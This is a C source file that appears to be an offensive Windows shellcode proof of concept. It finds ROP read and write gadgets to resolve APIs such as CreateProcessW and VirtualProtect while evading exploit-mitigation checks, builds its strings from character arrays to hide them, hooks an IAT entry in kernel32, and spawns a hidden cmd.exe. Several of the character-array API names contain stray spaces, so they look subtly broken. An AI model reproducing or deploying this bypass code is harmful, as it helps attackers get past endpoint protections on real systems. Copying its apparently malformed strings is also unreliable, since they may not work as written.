#include <Windows.h>
#include <stddef.h>
#ifdef DEBUG_D
    #include <stdio.h>
#endif
#include "defs.h"
#include "hunter.h"
#include "finder.h"
#include "rop.h"

int hook_function(){
    return 0xdeadbeef;
}

#if defined(_WIN64)
int main()
#else 
int main_x86(int shellcode_address)
#endif
{
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    SecureZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.wShowWindow = SW_HIDE;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

    wchar_t kernelbase_dll_name[] = { 'k','e','r','n','e','l','b','a','s','e','.','d','l','l', 0};
    wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0};
    //wchar_t ntdll_dll_wname[] = { 'n','t','d','l','l','.','d','l','l', 0 };
    //wchar_t verifier_dll_wname[] = { 'v','e','r','i','f','i','e','r','.','d','l','l', 0 };
    //wchar_t payloadrestrictions_dll_wname[] = { 'p','a','y','l','o','a','d','r','e','s','t','r','i','c','t','i','o','n','s','.','d','l','l', 0 };
    
    rop_gadget read_gadget;
    SecureZeroMemory(&read_gadget, sizeof(read_gadget));

    rop_gadget write_gadget;
    SecureZeroMemory(&write_gadget, sizeof(write_gadget));

    short int found = find_read_gadget(&read_gadget);

    //printf("Gadget address: %p\nGadget Offset: %u\nGadget sign %u\n",read_gadget.Address,read_gadget.Offset,read_gadget.Negative);

    // We didn't find anything..
    if(found == 0){
        return 0;
    }

    found = find_write_gadget(&write_gadget);

    //printf("Gadget address: %p\nGadget Offset: %u\nGadget sign %u\n",write_gadget.Address,write_gadget.Offset,write_gadget.Negative);

    // We didn't find anything..
    if(found == 0){
        return 0;
    }

    wchar_t cmd_exe_name[] = { 'c', 'm', 'd', '.', 'e', 'x', 'e',' ','/','c',' ','d','i','r', 0 };

    char CreateProcessW_char[] = { 'C', 'r', 'e', 'a',' t', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'W' , 0};
    char GetStdHandle_char[] = { 'G', 'e', 't', 'S',' t', 'd', 'H', 'a', 'n', 'd', 'l', 'e', 0};
    char VirtualProtect_char[] = { 'V', 'i', 'r', 't',' u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0};

    LPVOID kernelbase = help_GetModuleHandle(kernelbase_dll_name);

    ptrCreateProcessW _CreateProcessW = help_GetProcAddress((HMODULE)kernelbase,(LPSTR)CreateProcessW_char, &read_gadget);

    //_CreateProcessW = help_GetProcAddress_Fail((HMODULE)kernelbase,(LPSTR)CreateProcessW_char, &read_gadget);

    ptrGetStdHandle _GetStdHandle = help_GetProcAddress((HMODULE)kernelbase,(LPSTR)GetStdHandle_char, &read_gadget);
    ptrVirtualProtect _VirtualProtect = help_GetProcAddress((HMODULE)kernelbase,(LPSTR)VirtualProtect_char, &read_gadget);


    // Hook one of the protected API in kernel32.dll
    // Others are just fine

    LPVOID kernel32 = help_GetModuleHandle(kernel32_dll_name);
    char GetModuleHandleA_char[] = { 'G', 'e', 't', 'M',' o', 'd', 'u', 'l', 'e', 'H', 'a','n','d','l','e','A', 0};

    // Here the x86 doesn't take the functions address as relative
    // So this will work as standalone binary but fail as shellcode
    // Here we need to do some hacky stuff to get our function address

    #if defined(_WIN64)
        void * hook_func = hook_function;
    #else

        #ifndef DEBUG_D
        
        // This will load offset with base address
        void * hook_func_temp = hook_function;

        // Here we can get an offset to the function
        // 0x400000 is the default base however keep in mind that .text is 0x1000 away
        int offset = (char *) hook_func_temp - 0x401000;

        // Now we just add them together
        void * hook_func = (void *)(shellcode_address + offset);

        #else
            // We don't have these issues in CRT compiled environment
            void * hook_func = (void *)hook_function;
        #endif

    #endif

    HookIATFunction(kernel32, (LPSTR)GetModuleHandleA_char, &read_gadget, &write_gadget, hook_func, _VirtualProtect);

    si.hStdError = _GetStdHandle(STD_ERROR_HANDLE);
    si.hStdOutput = _GetStdHandle(STD_OUTPUT_HANDLE);

    _CreateProcessW(
		NULL,                           // Main program 
        cmd_exe_name,    				// Args
        NULL,                           // Process handle not inheritable
        NULL,                           // Thread handle not inheritable
        TRUE,                           // Handle inheritance
        0,                              // Creation flags - no windows popup
        NULL,                           // Use parent's environment block
        NULL,                           // Use parent's starting directory 
        &si,                            // Pointer to STARTUPINFO
        &pi								// Pointer to PROCESS_INFORMATION
		);
    // Crash

    return 0;  
}